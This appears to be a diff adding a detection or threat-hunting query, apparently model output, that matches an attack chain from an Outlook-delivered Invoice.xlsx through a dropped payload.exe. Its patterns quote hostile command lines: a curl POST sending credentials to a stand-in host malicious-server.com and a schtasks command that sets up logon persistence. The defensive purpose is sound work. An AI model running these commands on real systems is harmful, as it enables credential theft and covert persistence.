@@ -1,0 +1,8 @@
+<output>
+(srcNode.Name: "Outlook" AND srcNode.relation: "Process Create" AND dstNode.Name: "Invoice.xlsx" AND dstNode.Type: "File") OR 
+(srcNode.Image: "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\OfficeXX\\\\EXCEL.EXE" AND srcNode.relation: "Process Create" AND dstNode.Name: "payload.exe" AND dstNode.Type: "File") OR 
+(srcNode.Image: "C:\\\\Windows\\\\System32\\\\cmd.exe" AND srcNode.Cmdline: '*cmd.exe /c start "" "%TEMP%\\\\payload.exe"*' AND srcNode.relation: "Process Create" AND dstNode.Name: "payload.exe" AND dstNode.Type: "Process") OR 
+(srcNode.Image: "C:\\\\Windows\\\\System32\\\\cmd.exe" AND srcNode.Cmdline: '*curl -X POST http://malicious-server.com/exfiltrate*' AND srcNode.relation: "TCP Connect" AND dstNode.Dstaddress: "malicious-server.com" AND dstNode.Port: (80 OR 443) AND dstNode.Type: "Network") OR 
+(srcNode.Image: "C:\\\\Windows\\\\System32\\\\cmd.exe" AND srcNode.Cmdline: '*curl -X POST http://malicious-server.com/exfiltrate -d "username=user&password=pass"*' AND srcNode.relation: "TCP Send" AND dstNode.Dstaddress: "malicious-server.com" AND dstNode.Port: (80 OR 443) AND dstNode.Type: "Network") OR 
+(srcNode.Image: "C:\\\\Windows\\\\System32\\\\schtasks.exe" AND srcNode.Cmdline: '*schtasks /create /tn "MaliciousTask" /tr "%TEMP%\\\\payload.exe" /sc onlogon /rl highest*' AND srcNode.relation: "Process Create" AND dstNode.Name: "MaliciousTask" AND dstNode.Type: "Process")
+</output>
